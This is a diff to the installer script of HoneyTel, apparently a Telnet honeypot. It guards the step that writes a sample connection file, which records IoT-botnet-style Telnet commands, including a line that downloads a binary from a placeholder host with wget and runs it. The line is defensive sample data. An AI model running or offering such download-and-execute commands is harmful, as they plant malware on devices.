@@ -763,24 +763,28 @@ else
 	cd HoneyTel
 	sudo bash create_config.sh
 	sudo pip install -r requirements.txt
-	sudo touch .info
-	sudo chown $USER:$USER .info
-	echo "Sample Connection" >> .info
-	echo "" >> .info
-	echo "enable" >> .info
-	echo "shell" >> .info
-	echo "sh" >> .info
-	echo "cat /proc/mounts; /bin/busybox PEGOK" >> .info
-	echo "cd /tmp; (cat .s || cp /bin/echo .s); /bin/busybox PEGOK" >> .info
-	echo "nc; wget; /bin/busybox PEGOK" >> .info
-	echo "(dd bs=52 count=1 if=.s || cat .s)" >> .info
-	echo "/bin/busybox PEGOK" >> .info
-	echo "rm .s; wget http://example.com:4636/.i; chmod +x .i; ./.i; exit" >> .info
-	sleep 1
-	sudo apt-get install python-setuptools python-werkzeug \
-                python-flask python-sqlalchemy \
-                python-requests python-decorator python-dnspython \
-                python-ipaddress python-simpleeval python-yaml
+	if [[ -f '.info' ]]; then
+		sleep 1
+	else
+		sudo touch .info
+		sudo chown $USER:$USER .info
+		echo "Sample Connection" >> .info
+		echo "" >> .info
+		echo "enable" >> .info
+		echo "shell" >> .info
+		echo "sh" >> .info
+		echo "cat /proc/mounts; /bin/busybox PEGOK" >> .info
+		echo "cd /tmp; (cat .s || cp /bin/echo .s); /bin/busybox PEGOK" >> .info
+		echo "nc; wget; /bin/busybox PEGOK" >> .info
+		echo "(dd bs=52 count=1 if=.s || cat .s)" >> .info
+		echo "/bin/busybox PEGOK" >> .info
+		echo "rm .s; wget http://example.com:4636/.i; chmod +x .i; ./.i; exit" >> .info
+		sleep 1
+		sudo apt-get install python-setuptools python-werkzeug \
+					python-flask python-sqlalchemy \
+					python-requests python-decorator python-dnspython \
+					python-ipaddress python-simpleeval python-yaml
+	fi
 	if [[ -f '.setup' ]]; then
 		sleep 1
 	else
@@ -798,7 +802,7 @@ else
 		sudo service mysql start
 		sudo mysql -l root
 		sleep 2
-		echo -e "${W}Set your login credentials upon first using HoneyTel HTTP Panel \n These are saved in /opt/HoneyTel/config.yaml${NC}"
+		echo -e "${W}Set your login credentials upon first using HoneyTel HTTP Panel \nThese are saved in /opt/HoneyTel/config.yaml${NC}"
 	fi
 fi
 
